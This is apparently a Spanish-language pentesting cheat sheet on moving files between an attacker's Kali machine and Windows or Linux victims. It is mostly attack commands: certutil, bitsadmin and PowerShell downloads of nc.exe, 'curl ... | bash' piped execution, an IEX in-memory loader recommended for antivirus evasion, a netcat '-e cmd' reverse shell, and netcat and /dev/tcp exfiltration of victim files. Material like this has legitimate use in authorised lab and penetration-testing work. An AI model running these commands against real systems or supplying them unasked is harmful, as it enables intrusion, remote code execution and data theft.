# Transferencia de Archivos

Tags: #FileTransfer #LinuxToWindows #LinuxToLinux #WindowsToLinux #Certutil #Python #Impacket #SCP #IEX #Bitsadmin #NC #Base64

[LOLBAS](https://lolbas-project.github.io/)

## TIPS

1. **Servidor HTTP Python → el método más rápido cuando hay conectividad HTTP**
2. **SMB con impacket → mejor opción cuando HTTP está bloqueado**
3. **Certutil → siempre disponible en Windows → no requiere herramientas extra**
4. **IEX → ejecuta en memoria → no toca el disco → más sigiloso**
5. **Base64 → útil cuando no hay conectividad de red → copiar/pegar por consola**
6. **SCP → requiere SSH activo en destino y conocer credenciales**

---

## DIRECTORIOS CON ESCRITURA

```bash
# Windows
C:\Temp
C:\Windows\Temp
C:\ProgramData
C:\Users\Public

# Linux
/tmp
/var/tmp
/dev/shm
```

---

## LINUX (ATACANTE) → WINDOWS (VÍCTIMA)

### Atacante — Preparar servidor para enviar archivos

* [Netcat](https://eternallybored.org/misc/netcat/)

```bash
1. ❯ python3 -m http.server 80
   # Servidor HTTP simple → servir archivos del directorio actual

2. ❯ python -m SimpleHTTPServer 80
   # Python 2 → alternativa si python3 no está disponible

3. ❯ impacket-smbserver smbFolder $(pwd) -smb2support
   # Servidor SMB → mejor cuando HTTP está bloqueado en la víctima
   # smb2support → soporte SMB2 para Windows 10+

# MEJOR OPCIÓN SIEMPRE 
4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123
   # Con credenciales → cuando Windows bloquea conexiones SMB anónimas
   # El user y la passwd son inventadas (No importa)


EXTRA:
   ❯ php -S 0.0.0.0:80
   # Servidor HTTP con PHP → alternativa a Python
```

### Víctima Windows — Descargar (Subir) a Windows 

```bash
1  ❯ powershell -c "Invoke-WebRequest http://<IP>/nc.exe -OutFile nc.exe"
   ❯ powershell -c "IWR http://<IP>/nc.exe -OutFile nc.exe"
   ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','nc.exe')"
   # PowerShell → varias alternativas si una falla
   ❯ IEX (New-Object Net.WebClient).DownloadString('http://Kali/PowerView.ps1')

2  ❯ certutil -urlcache -f http://<IP>/nc.exe C:\Users\Public\nc.exe
   ❯ certutil.exe -f -urlcache -split http://<IP>/nc.exe C:\Temp\nc.exe
   ❯ C:\Windows\System32\certutil.exe -urlcache -f http://<IP>/nc.exe C:\Temp\nc.exe
   # Certutil → siempre disponible en Windows porque es un LOLBAS → muy fiable

3 ❯ copy \\<IP>\smbFolder\File.exe File.exe
   # Copiar archivo desde SMB de Kali a Windows
   ❯ \\<IP>\smbFolder\nc.exe -e cmd <IP> 443
   # Ejecutar directamente desde el SMB sin copiar al disco

4 ❯ net use x: \\IP_Kali\smbFolder /u:omar omar123
   # En Windows colocar las credenciales para hacer la transferencia
   # Se debe de copiar todo el folder y no por archivo  
   # Al solo hacer 'dir' no mostrará el volúmen pero si existirá
	  ❯ dir x:\    # Mirar el contenido que se ha compartido 
	  ❯ copy x:\nc.exe nc.exe   # Copiar el archivo hacia Windows
	  ❯ copy file x:\file       # Copiar el archivo hacia Kali
	  ❯ net use * /delete       # Terminar la conexión autenticada 


EXTRA:
   ❯ bitsadmin /transfer job http://<IP>/nc.exe C:\Temp\nc.exe
   # BITS → descarga en segundo plano → a veces evita restricciones

   ❯ certutil -decode input.b64 output.exe
   # Decodificar archivo base64 → útil cuando solo puedes copiar texto
```

---

## LINUX (ATACANTE) → LINUX (VÍCTIMA)

### Atacante — Preparar servidor para enviar archivos

```bash
1. ❯ python3 -m http.server 80
   # Servidor HTTP → método más común

2. ❯ python -m SimpleHTTPServer 80
   # Python 2 → alternativa si python3 no está disponible

3. ❯ base64 -w 0 script.sh | xclip -sel clip
   # Copiar script en base64 al portapapeles
   # → pegar directamente en la consola de la víctima

4. ❯ nc -nlvp 443 > file
   # Recibir data de la víctima
```

```bash 
EXTRA:
# Transferencia directa usando SSH
❯ scp -i id_rsa_editorial /home/Documents/chisel admin@IP:/tmp/chisel 
	# IP = Es la IP de la máquina víctima 
```

### Víctima Linux — Descargar (Subir) a Linux

```bash
1. ❯ wget http://<IP>/payload.sh
   ❯ wget http://<IP>/linpeas.sh -O /tmp/linpeas.sh
   # wget → el más común en Linux

2. ❯ curl http://<IP>/payload.sh -o payload.sh
   ❯ curl http://<IP>/payload.sh | bash
   # curl → ejecutar directamente en memoria con pipe a bash

3. ❯ echo <base64_string> | base64 -d > script.sh
   # Decodificar base64 pegado directamente en la consola
   # Útil cuando no hay conectividad de red

4. ❯ nc <IP_KALI> 443 < File.zip
   # Enviar archivo a Kali vía netcat

EXTRA: 
   ❯ cat < file.txt > /dev/tcp/<IP_KALI>/443
   # Enviar archivo usando /dev/tcp → sin netcat

   ❯ scp file.txt user@<IP_KALI>:/tmp/
   # SCP → requiere SSH en Kali y credenciales
```

---

## WINDOWS (VÍCTIMA) → LINUX (ATACANTE)

### Víctima Windows — Enviar a Kali

```bash
1. ❯ scp -r C:\Carpeta user@<IP_KALI>:/tmp/destino/
   ❯ scp C:\archivo.exe user@<IP_KALI>:/tmp/destino/
   # SCP → requiere SSH activo en Kali y credenciales del usuario Linux
   # -r → recursivo para carpetas

   ❯ copy .\file.exe \\<IP_KALI>\smbFolder\
   # Copiar de Windows a Kali via SMB
   # Kali debe tener impacket-smbserver activo

2. ❯ net use \\<IP_KALI>\smbFolder /u:omar omar123
	   ❯ dir \\<IP_KALI>\smbFolder\
	   ❯ copy file.exe \\<IP_KALI>\smbFolder\
	   # Montar SMB con credenciales → luego copiar

3. ❯ powershell -c "Invoke-WebRequest -Uri http://<IP_KALI>/upload -Method POST -InFile C:\archivo.txt"
   # POST upload a servidor HTTP de Kali
```

### Atacante Kali — Recibir desde Windows

```bash
1. ❯ impacket-smbserver smbFolder $(pwd) -smb2support
   # SMB anónimo → Windows 7/8

2. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123
   # SMB con credenciales → Windows 10/11 (bloquea anónimo por defecto)

3. ❯ python3 -m http.server 80
   # Si Windows hace GET/POST al servidor de Kali
```

---

## LINUX (VÍCTIMA) → LINUX (ATACANTE)

### Víctima Linux — Enviar a Kali

```bash 
1. ❯ cat /ruta/al/archivo | nc IP_Kali 4444
```

### Atacante Kali — Recibir desde Linux víctima

```bash 
1. ❯ nc -lvnp 4444 > archivo_descargado
```

---

## WINRM / EVIL-WINRM

```bash
# Dentro de sesión evil-winrm → comandos integrados

1. ❯ upload /ruta/en/kali/file.exe
   # Subir archivo de Kali a la víctima Windows
   # No necesita servidor HTTP ni SMB

2. ❯ download C:\ruta\archivo.zip ./archivo_local.zip
   # Descargar archivo de la víctima a Kali

3. ❯ IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')
   # Cargar y ejecutar script PowerShell en memoria
   # No toca el disco → más sigiloso → útil para AV evasion
```

---

## METERPRETER

```bash
1. ❯ upload /ruta/kali/file.exe C:\Temp\file.exe
   # Subir archivo a la víctima

2. ❯ download C:\Temp\archivo.zip /ruta/kali/
   # Descargar archivo de la víctima

3. ❯ shell
   # Obtener shell del sistema → luego usar certutil/powershell
```

---

## CERTUTIL — REFERENCIA COMPLETA

```bash
# Descargar archivo desde URL
❯ certutil -urlcache -f http://<IP>/archivo.exe C:\Temp\archivo.exe
❯ certutil.exe -f -urlcache -split http://<IP>/archivo.exe C:\Temp\archivo.exe

# Descargar desde URL directa (GitHub releases, etc.)
❯ certutil -urlcache -f https://github.com/user/repo/releases/download/v1.0/tool.exe C:\Users\Public\tool.exe

# Codificar archivo a base64 (para transferir por consola)
❯ certutil -encode input.exe output.b64

# Decodificar archivo desde base64
❯ certutil -decode input.b64 output.exe

# Calcular hash de un archivo (verificar integridad)
❯ certutil -hashfile archivo.exe MD5
❯ certutil -hashfile archivo.exe SHA256
```

---

## BASE64 — TRANSFERENCIA SIN RED

```bash
# Cuando no hay conectividad HTTP/SMB → transferir copiando texto

# En Kali → codificar
❯ base64 -w 0 archivo.sh
❯ base64 -w 0 archivo.exe | xclip -sel clip
# -w 0 → sin saltos de línea → más fácil de copiar

# En la víctima Linux → decodificar
❯ echo <base64_string> | base64 -d > archivo.sh
❯ chmod +x archivo.sh

# En la víctima Windows → decodificar con certutil
❯ echo <base64_string> > archivo.b64
❯ certutil -decode archivo.b64 archivo.exe

# Desde Windows a Kali → codificar en PowerShell
❯ [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\archivo.exe'))
# Copiar el output → en Kali: echo <string> | base64 -d > archivo.exe
```

---

## SCP — REFERENCIA COMPLETA

```bash
# Linux → Linux
❯ scp archivo.txt user@<IP>:/tmp/
❯ scp -r directorio/ user@<IP>:/tmp/

# Windows → Linux (desde CMD/PowerShell)
❯ scp C:\archivo.exe user@<IP_KALI>:/tmp/
❯ scp -r C:\Carpeta user@<IP_KALI>:/tmp/destino/
# -r → recursivo

# Linux → Windows (desde Kali)
❯ scp archivo.exe user@<IP_WIN>:C:\Temp\

# Copiar desde Linux a Kali
❯ scp user@<IP>:/ruta/archivo.txt .
# . → directorio actual de Kali
```